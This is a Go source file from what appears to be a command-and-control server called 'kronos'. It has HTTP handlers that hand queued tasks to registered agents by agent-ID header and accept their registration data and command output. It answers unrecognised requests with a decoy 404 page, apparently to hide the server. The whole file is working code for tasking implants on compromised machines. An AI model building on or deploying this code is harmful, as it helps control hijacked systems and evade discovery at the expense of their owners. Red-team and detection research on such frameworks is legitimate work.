package server

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"net/http"

	"github.com/z3vxo/kronos/internal/bytemgr"
)

const (
	CMD_TYPE_REGISTER = 1
	CMD_TYPE_OUTPUT   = 2
)

func Send404(w http.ResponseWriter) {
	w.Header().Set("Content-Type", "text/html")
	w.WriteHeader(http.StatusNotFound)
	w.Write([]byte(notFound))
}

func (h *AgentHandler) AgentCheckInHandler(w http.ResponseWriter, r *http.Request) {
	AgentGuid := r.Header.Get("X-Agent-ID")
	Host := r.Host
	if reqh, _, err := net.SplitHostPort(Host); err == nil {
		Host = reqh
	}
	if AgentGuid == "" || Host != h.Host {
		Send404(w)
		return
	}

	if ok := h.DB.AgentExist(AgentGuid); !ok {
		Send404(w)
		return
	}

	data, err := h.DB.GetTasks(AgentGuid)
	if err != nil {
		fmt.Println(err)
		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte("0"))
		return
	}

	if len(data) == 0 {
		w.WriteHeader(http.StatusNoContent)
		w.Write([]byte("0"))
		return
	}

	cmdBytes, err := bytemgr.CraftCmdBytes(data)
	if err != nil {
		fmt.Println(err)

		w.WriteHeader(http.StatusInternalServerError)
		w.Write([]byte("0"))
		return
	}

	w.WriteHeader(http.StatusOK)
	w.Write(cmdBytes)
	return

}

func (h *AgentHandler) AgentUploadHandler(w http.ResponseWriter, r *http.Request) {
	AgentGuid := r.Header.Get("X-Agent-ID")
	Host := r.Host
	if reqh, _, err := net.SplitHostPort(Host); err == nil {
		Host = reqh
	}
	if Host != h.Host {
		Send404(w)
		return
	}
	defer r.Body.Close()

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "failed", http.StatusInternalServerError)
		return
	}

	reader := bytes.NewReader(body)
	var cmdType int32
	if err := binary.Read(reader, binary.LittleEndian, &cmdType); err != nil {
		http.Error(w, "failed reading cmd type", http.StatusInternalServerError)
		return
	}

	switch cmdType {
	case CMD_TYPE_REGISTER:

		ip, _, _ := net.SplitHostPort(r.RemoteAddr)
		err := h.HandleClientRegister(ip, reader)
		if err != nil {
			http.Error(w, "failed getting data", http.StatusInternalServerError)
		}
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("SUCCESS"))

	case CMD_TYPE_OUTPUT:
		if AgentGuid == "" {
			Send404(w)
			return
		}
		go h.HandleAgentOutput(reader, AgentGuid)
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("OK"))

	}
}
